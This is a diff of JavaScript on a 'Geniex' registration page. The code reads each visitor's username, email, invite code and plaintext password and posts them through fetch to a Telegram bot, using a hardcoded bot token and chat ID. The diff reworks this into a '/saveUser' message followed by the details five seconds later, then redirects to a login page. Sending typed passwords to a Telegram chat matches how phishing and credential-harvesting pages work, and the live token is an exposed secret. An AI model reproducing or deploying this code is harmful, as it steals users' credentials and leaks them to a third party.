@@ -157,8 +157,24 @@
       const invite = document.getElementById("invite").value;
       const password = document.getElementById("password").value;
 
-      const message = `
-/saveUser
+      const token = "7771412415:AAFU8jVhc-OyvCigmEAMSbeiPFrGkr4zhOQ";
+      const chat_id = "6707173438";
+      const apiURL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      // Step 1: Send /saveUser first
+      fetch(apiURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: "/saveUser"
+        })
+      })
+      .then(response => response.json())
+      .then(() => {
+        // Step 2: Send the user details after 5 seconds
+        setTimeout(() => {
+          const message = `
 🟣 *New Geniex Registration*
 👤 *Username:* ${username}
 📧 *Email:* ${email}
@@ -167,36 +183,32 @@
 🔒 *Password:* ${password}
 `;
 
-      const token = "7771412415:AAFU8jVhc-OyvCigmEAMSbeiPFrGkr4zhOQ";
-      const chat_id = "6707173438";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+          fetch(apiURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chat_id,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          })
+          .then(res => res.json())
+          .then(data => {
+            if (data.ok) {
+              const successBox = document.getElementById("successBox");
+              successBox.style.display = "flex";
+              successBox.style.opacity = 0;
+              void successBox.offsetWidth;
+              successBox.style.animation = "fadeIn 0.5s ease-in-out forwards";
 
-      fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          const successBox = document.getElementById("successBox");
-          successBox.style.display = "flex";
-          successBox.style.opacity = 0;
-          void successBox.offsetWidth;
-          successBox.style.animation = "fadeIn 0.5s ease-in-out forwards";
-
-          setTimeout(() => {
-            window.location.href = "login.html";
-          }, 2500);
-        } else {
-          alert("Something went wrong. Please try again.");
-        }
+              setTimeout(() => {
+                window.location.href = "login.html";
+              }, 2500);
+            } else {
+              alert("Something went wrong. Please try again.");
+            }
+          });
+        }, 5000);
       })
       .catch(error => {
         console.error("Error:", error);
